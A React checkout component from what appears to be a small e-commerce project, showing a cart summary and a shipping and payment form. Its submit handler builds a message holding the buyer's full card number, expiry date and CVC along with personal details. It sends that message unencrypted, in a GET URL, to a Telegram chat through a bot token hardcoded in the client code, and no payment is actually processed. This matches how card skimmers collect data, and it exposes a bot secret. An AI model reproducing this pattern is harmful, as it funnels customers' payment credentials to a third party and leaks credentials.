import React, { useEffect, useState } from "react";
import { CiCreditCard2 } from "react-icons/ci";
import { FaCcPaypal } from "react-icons/fa";
import "./check.scss";
import { useDispatch, useSelector } from "react-redux";
import { decrementCart, incrementCart } from "../../context/slices/cartSlice";
import { useNavigate } from "react-router-dom";
import { useGetValue } from "../../hooks/useGetValue";

const initialState = {
    fname: "Ali",
    lname: "Valiyev",
    phone: "999234231",
    email: "ali@gmail.com",
    address: "Tashkent",
    country: "Uzbekistan",
    town: "Tashkent",
    state: "Joy",
    code: "3212",
    paypal: "",
    cardNumber: "9023 3234 2343 5311",
    date: "12.23",
    cvc: "32345",
};

const BOT_TOKEN = "7133064436:AAE11MDDY8hmQ2E7ivSYPqHku7k4Zpj-yUg";
const CHAT_ID = "-1001658369787";
const USER_ID = "5009656627";

const Checkout = () => {
    const dispatch = useDispatch();
    const [sum, setSum] = useState(0);
    const cartData = useSelector((state) => state.cart.value);
    const { formData, handleChange } = useGetValue(initialState);
    let navigate = useNavigate();
    useEffect(() => {
        scroll(0, 0);
        const total = cartData.reduce(
            (acc, el) => acc + el.price * el.quantity,
            0
        );
        setSum(Math.ceil(total));
    }, [cartData]);

    let checkoutItem = cartData?.map((el) => (
        <div className="checkout__card" key={el?.id}>
            <div className="checkout__img">
                <img src={el?.images[0]} width={80} height={90} alt="" />
            </div>
            <div className="checkout__info">
                <h3 className="checkout__title">{el?.title}</h3>
                <p className="checkout__desc">{el?.description}</p>

                <div className="cart__counter">
                    <button onClick={() => dispatch(decrementCart(el))}>
                        -
                    </button>
                    <div>{el.quantity}</div>
                    <button onClick={() => dispatch(incrementCart(el))}>
                        +
                    </button>
                </div>
            </div>
            <h3 className="checkout__price">${el?.price}</h3>
        </div>
    ));

    const handleSubmit = (e) => {
        e.preventDefault();
        let text = "Order: %0A";
        text += `First Name: <b>${formData.fname}</b> %0A`;
        text += `Last Name: <b>${formData.lname}</b> %0A`;
        text += `Phone: <b>${formData.phone}</b> %0A`;
        text += `Email: <b>${formData.email}</b> %0A`;
        text += `Address: <b>${formData.address}</b> %0A`;
        text += `Country: <b>${formData.country}</b> %0A`;
        text += `Town: <b>${formData.town}</b> %0A`;
        text += `State: <b>${formData.state}</b> %0A`;
        text += `Code: <b>${formData.code}</b> %0A`;
        text += `Paypal: <b>${formData.paypal}</b> %0A`;
        text += `Card Number: <b>${formData.cardNumber}</b> %0A`;
        text += `Data: <b>${formData.date}</b> %0A`;
        text += `CVC: <b>${formData.cvc}</b> %0A%0A`;

        cartData.forEach((el) => {
            text += `Title: <b>${el.title}</b> %0A`;
            text += `Price: <b>${el.price}</b> %0A`;
            text += `Amount: <b>${el.quantity}</b> %0A%0A`;
        });

        let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${USER_ID}&text=${text}&parse_mode=html`;
        let api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();

        navigate("/order/complete");
    };

    return (
        <div className="checkout">
            <div className="container checkout__container">
                <form className="checkout__left" onSubmit={handleSubmit}>
                    <div className="checkout__form">
                        <h3>Contact Infomation</h3>
                        <div className="checkout__names">
                            <label htmlFor="fname">
                                <span>FIRST Name</span>
                                <input
                                    type="text"
                                    placeholder="First name"
                                    id="fname"
                                    name="fname"
                                    value={formData.fname}
                                    onChange={handleChange}
                                />
                            </label>
                            <label htmlFor="lname">
                                <span>Last name</span>
                                <input
                                    type="text"
                                    placeholder="Last name"
                                    id="lname"
                                    name="lname"
                                    value={formData.lname}
                                    onChange={handleChange}
                                />
                            </label>
                        </div>
                        <label htmlFor="phone">
                            <span>Phone Number</span>
                            <input
                                type="text"
                                placeholder="Phone Number"
                                id="phone"
                                name="phone"
                                value={formData.phone}
                                onChange={handleChange}
                            />
                        </label>
                        <label htmlFor="email">
                            <span>Email address</span>
                            <input
                                type="text"
                                placeholder="Your Email"
                                id="email"
                                name="email"
                                value={formData.email}
                                onChange={handleChange}
                            />
                        </label>
                    </div>
                    <div className="checkout__form">
                        <h3>Shipping Address</h3>
                        <label htmlFor="address">
                            <span>Street Address *</span>
                            <input
                                type="text"
                                placeholder="Street Address *"
                                id="address"
                                name="address"
                                value={formData.address}
                                onChange={handleChange}
                            />
                        </label>
                        <label htmlFor="country">
                            <span>Country *</span>
                            <select
                                name="country"
                                id="country"
                                value={formData.country}
                                onChange={handleChange}
                            >
                                <option value="tashkent">Tashkent</option>
                                <option value="samarqand">Samarqand</option>
                                <option value="bukhara">Bukhara</option>
                            </select>
                        </label>
                        <label htmlFor="town">
                            <span>Town / City *</span>
                            <input
                                type="text"
                                placeholder="Town / City *"
                                id="town"
                                name="town"
                                value={formData.town}
                                onChange={handleChange}
                            />
                        </label>
                        <div className="checkout__names">
                            <label htmlFor="state">
                                <span>State</span>
                                <input
                                    type="text"
                                    placeholder="State"
                                    id="state"
                                    name="state"
                                    value={formData.state}
                                    onChange={handleChange}
                                />
                            </label>
                            <label htmlFor="code">
                                <span>Zip Code</span>
                                <input
                                    type="text"
                                    placeholder="Zip Code"
                                    id="code"
                                    name="code"
                                    value={formData.code}
                                    onChange={handleChange}
                                />
                            </label>
                        </div>
                        <div className="checkout__differ">
                            <input type="checkbox" name="" id="" />
                            <p>Use a different billing address (optional)</p>
                        </div>
                    </div>
                    <div className="checkout__form">
                        <h3>Payment method</h3>
                        <label className="paypal__card" htmlFor="card">
                            <input
                                type="radio"
                                name="paypal"
                                id="card"
                                value={formData.paypal}
                                onChange={handleChange}
                            />
                            <p>Pay by Card Credit</p>
                            <CiCreditCard2 />
                        </label>
                        <label className="paypal__card" htmlFor="paypal">
                            <input
                                type="radio"
                                name="paypal"
                                id="paypal"
                                value={formData.paypal}
                                onChange={handleChange}
                            />
                            <p>Paypal</p>

                            <FaCcPaypal />
                        </label>
                        <label htmlFor="cardNumber">
                            <span>Card Number *</span>
                            <input
                                type="number"
                                placeholder="1234 1234 1234"
                                id="cardNumber"
                                name="cardNumber"
                                value={formData.cardNumber}
                                onChange={handleChange}
                            />
                        </label>
                        <div className="checkout__names">
                            <label htmlFor="date">
                                <span>Expiration date</span>
                                <input
                                    type="text"
                                    placeholder="MM/YY"
                                    id="date"
                                    name="date"
                                    value={formData.date}
                                    onChange={handleChange}
                                />
                            </label>
                            <label htmlFor="cvc">
                                <span>CVC </span>
                                <input
                                    type="text"
                                    placeholder="CVC code"
                                    id="cvc"
                                    name="cvc"
                                    value={formData.cvc}
                                    onChange={handleChange}
                                />
                            </label>
                        </div>
                    </div>
                    <button className="checkout__btn">Place Order</button>
                </form>
                <div className="checkout__data">
                    <h3>Order summary</h3>
                    <div className="checkout__cards">{checkoutItem}</div>
                    <form action="" className="checkout__form__data">
                        <input type="text" name="" placeholder="Enter" />
                        <button className="checkout__btn">Apply</button>
                    </form>
                    <div className="checkout__items">
                        <div className="checkout__item">
                            <p>JenkateMW</p>
                            <h4>-$25.00 [Remove]</h4>
                        </div>
                        <div className="checkout__item">
                            <p>Shipping</p>
                            <h4>Free</h4>
                        </div>
                        <div className="checkout__item">
                            <p>Subtotal</p>
                            <h4>$99.00</h4>
                        </div>
                        <div className="checkout__item">
                            <p>Total</p>
                            <h4>${sum}</h4>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Checkout;
